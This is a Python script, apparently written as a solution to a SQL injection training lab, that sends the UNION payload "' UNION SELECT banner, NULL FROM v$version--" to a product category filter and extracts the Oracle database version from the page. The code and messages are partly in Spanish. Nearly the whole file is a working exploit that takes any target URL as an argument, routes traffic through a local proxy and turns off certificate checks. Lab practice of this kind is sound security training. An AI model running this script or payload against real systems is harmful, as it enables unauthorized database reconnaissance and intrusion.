# Lab: SQL injection attack, querying the database type and version on Oracle 
# PRACTITIONER

# This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
# To solve the lab, display the database version string.
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080'}
Payload ="' UNION SELECT banner, NULL FROM v$version--"
ParametroVulnerable = "filter?category="

def Sqli_Lab_04(Url):
    SolicitudWeb = requests.get(Url + ParametroVulnerable + Payload, verify=False, proxies=proxy )
    RespuestaServidor = SolicitudWeb.text
    if "Oracle Database" in RespuestaServidor:
        print("[+] Se encontro la versión de la base de datos oracle")
        Parseando = BeautifulSoup(RespuestaServidor,'html.parser')
        version = Parseando.find(string=re.compile('.*Oracle\sDatabase.*'))
        print("[+] La version de oracle es: " + version)
    else:
        print("[-] Unable to dump the database version.")

if __name__ == "__main__":
    try:
        Url = sys.argv[1].strip()
        print("[+] Dumping the version of the database...")
        print(f"Payload: {Payload}")
        Sqli_Lab_04(Url)
    except IndexError:
        print("[-] Uso: %s <url>" % sys.argv[0])
        print("[-] Ejemplo: %s www.example.com" % sys.argv[0])
        sys.exit(-1)